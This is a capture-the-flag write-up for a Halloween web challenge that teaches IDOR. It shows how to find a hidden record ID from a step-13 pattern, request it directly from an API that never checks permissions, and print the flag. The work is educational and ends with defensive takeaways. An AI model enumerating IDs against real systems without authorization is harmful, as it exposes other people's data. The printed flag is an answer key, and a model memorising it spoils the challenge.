---
title: "The Séance Archive"
category: web
difficulty: hard
date: 2026-10-28
ctf: BGSU CTF Halloween 2026
points: 400
author: Nick Francisco
tags: [idor, access-control, api, devtools, network-panel]
summary: The sealed record is locked only by a disabled button. The API serves any record by number without checking permissions, and the record IDs follow a pattern.
challengeUrl: https://happy-halloween-hard-challenge.vercel.app
---

## Overview

The Séance Archive lists six séance transcripts and lets you open five of them. The sixth is "sealed": its button is disabled and its ID is hidden. That lock exists only in the browser. The API that serves records by number never checks whether a record is sealed or who is asking, so working out the missing number and requesting it directly returns the flag. The challenge teaches the Network panel, spotting patterns in IDs, and IDOR (insecure direct object reference), one of the most common access control bugs on real sites.

## Challenge Description

> The Society for Psychical Correspondence keeps a transcript of every séance it has ever held: headless horsemen, witches, werewolves, and worse. Members may read any record they like, except one: a transcript sealed by the Head Medium on All Hallows' Eve. The seal looks very official. Find out what the spirits said that night. Flag format: BOO{...}

Challenge site: https://happy-halloween-hard-challenge.vercel.app. [Browser DevTools](/tools/browser-devtools) are enough, and [curl](/tools/curl) works too.

## Recon

The archive shows six cards. Five have a **Summon transcript** button. The sixth is chained shut with a greyed-out **Sealed** button, and its medium is listed as "withheld".

Removing the `disabled` attribute in the Elements panel does nothing useful. Reading `app.js` in the **Sources** panel shows why:

```javascript
const button = el('button', null, record.sealed ? 'Sealed' : 'Summon transcript');
button.type = 'button';
if (record.sealed) {
  // Only the Head Medium may open sealed records.
  button.disabled = true;
  button.title = 'Sealed by the Head Medium';
} else {
  button.addEventListener('click', () => openRecord(record.id));
}
```

The sealed button never gets a click handler, and the page never knew its ID. The answer has to come from the server.

## Walkthrough

### 1. Watch the Network panel

Open DevTools, go to **Network**, and reload. The page calls `/api/records`. Its response lists every record's ID except the sealed one:

```json
{ "id": 1013, "title": "The Headless Horseman", "medium": "Madame Orla Vex", "date": "1891-10-03", "sealed": false }
{ "id": 1026, "title": "The Witch of Willow Creek", "medium": "Brother Silas Penhallow", "date": "1891-10-11", "sealed": false }
{ "id": 1039, "title": "The Jack-o'-Lantern Man", "medium": "Madame Orla Vex", "date": "1891-10-19", "sealed": false }
{ "title": "Sealed by the Head Medium", "sealed": true }
{ "id": 1065, "title": "The Phantom Bride", "medium": "Brother Silas Penhallow", "date": "1891-11-02", "sealed": false }
{ "id": 1078, "title": "The Werewolf of Black Hollow", "medium": "Madame Orla Vex", "date": "1891-11-09", "sealed": false }
```

### 2. See how a record loads

Click **Summon transcript** on any open record. The Network panel shows a request to `/api/record?id=1013`, which matches `openRecord(id)` in `app.js`:

```javascript
async function openRecord(id) {
  const res = await fetch('/api/record?id=' + encodeURIComponent(id));
```

### 3. Work out the missing ID

The IDs go up by 13 each time (an unlucky step size): 1013, 1026, 1039, then the sealed record, then 1065 and 1078. The gap between 1039 and 1065 is exactly two steps, so the sealed record is **1052**.

### 4. Ask the API for it

Open `/api/record?id=1052` in a new tab, or run this in the Console:

```javascript
fetch('/api/record?id=1052').then(r => r.json()).then(d => console.log(d.record.title, d.record.flag))
// The Head Medium's Hallowe'en Séance BOO{th3_d34d_d0nt_ch3ck_p3rm1ss10ns}
```

The server returns the full sealed record, including a `flag` field, because it never checks permissions.

## Solution

```console
$ curl -s "https://happy-halloween-hard-challenge.vercel.app/api/record?id=1052" | grep -o 'BOO{[^}]*}'
BOO{th3_d34d_d0nt_ch3ck_p3rm1ss10ns}
```

A wrong ID, such as 1051, returns a 404 with "No spirit answers to that number", so guesses reveal nothing. Because the IDs are small, a player could also try every number from 1000 to 1100. That still works and does no harm, since the API is read-only. Spotting the pattern is the intended route.

## Flag

```text
BOO{th3_d34d_d0nt_ch3ck_p3rm1ss10ns}
```

## Takeaways

- When a page blocks you, find the API call behind it. The Network panel shows exactly what the front end asks the server for.
- A disabled button or hidden link is a user interface choice, not a security control. Everything in the browser is under the user's control.
- Look for patterns in IDs: sequential numbers, fixed steps, dates, or encoded values. A gap in a sequence often marks the interesting object.
- IDOR means the server takes an ID from the user and returns the object without checking whether that user may see it. Broken access control is number one on the OWASP Top 10.
- Random IDs make the bug harder to find but do not fix it. The fix is an authorization check on the server for every request: "is this caller allowed to read this record?"

## References

- [OWASP Top 10: A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger Web Security Academy: IDOR](https://portswigger.net/web-security/access-control/idor)
- [Chrome DevTools: Inspect network activity](https://developer.chrome.com/docs/devtools/network)
